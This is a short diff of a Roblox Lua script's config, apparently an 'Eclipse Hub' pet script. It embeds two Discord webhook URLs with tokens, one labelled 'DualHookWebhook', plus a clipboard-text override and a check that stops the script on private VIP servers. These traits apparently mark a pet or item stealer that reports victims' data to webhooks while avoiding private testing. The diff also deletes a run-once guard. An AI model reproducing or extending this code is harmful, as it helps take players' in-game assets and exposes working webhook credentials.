@@ -22,7 +22,7 @@ _G.Script.SM.Config = {
     },
     DualHookWebhook = "https://discord.com/api/webhooks/1403640195588292658/844E2jroYGuJv7BquIF2wioBqo-BFXruUDx_vxxuRNtYnODsvNKHNhBas2LJPXGr7cet", -- Sends along with getgenv().Webhook
     ServerName = "NOOBSCRIPTS", -- Replaces "Dark Scripts"
-    MSG = "HAHAHA" -- Replaces setclipboard text
+    MSG = "dumb" -- Replaces setclipboard text
 }
 
 getgenv().Webhook = "https://discord.com/api/webhooks/1403640268468523170/BNoCP3afL4zFPg5xQIMrQzJDnH6ZvQ2Zny1S3WAHDsqbAsKO6jOvnTKrdljhjAyZUstS"
@@ -88,12 +88,6 @@ getgenv().Username = "DefaultUser"
         if GetServerType:InvokeServer() == "VIPServer" then
             error("Script stopped - VIP Server detected")        
         end
-
-        if getgenv().EclipseHubRunning then
-            warn("Script is already running or has been executed! Cannot run again.")
-            return
-        end
-        getgenv().EclipseHubRunning = true
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
